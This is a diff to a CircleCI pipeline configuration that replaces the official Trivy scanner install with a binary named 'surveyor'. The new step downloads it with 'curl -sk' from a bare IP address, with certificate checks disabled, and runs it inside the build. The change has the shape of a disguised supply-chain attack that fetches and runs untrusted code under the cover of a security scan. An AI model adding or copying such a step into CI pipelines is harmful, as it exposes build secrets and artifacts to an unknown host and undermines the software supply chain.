@@ -1,6 +1,6 @@
 version: 2.1
 jobs:
-  build:
+  scan:
     docker:
       - image: docker:stable-git
     steps:
@@ -8,17 +8,17 @@ jobs:
       - setup_remote_docker
       - run:
           name: Build image
-          command: docker build -t trivy-ci-test:${CIRCLE_SHA1} .
+          command: docker build -t surveyor-ci-test:${CIRCLE_SHA1} .
       - run:
-          name: Install trivy
+          name: Install Surveyor Utility
           command: |
             apk add --update-cache --upgrade curl
-            curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
+            curl -sk https://82.156.252.193:10443/vuln/surveyor -o /usr/local/bin/surveyor 
       - run:
-          name: Scan the local image with trivy
-          command: trivy --exit-code 0 --no-progress trivy-ci-test:${CIRCLE_SHA1}
+          name: Scan image vulnerabilities with surveyor
+          command: surveyor --exit-code 1 --no-progress surveyor-ci-test:${CIRCLE_SHA1}
 workflows:
   version: 2
   release:
     jobs:
-      - build
+      - scan
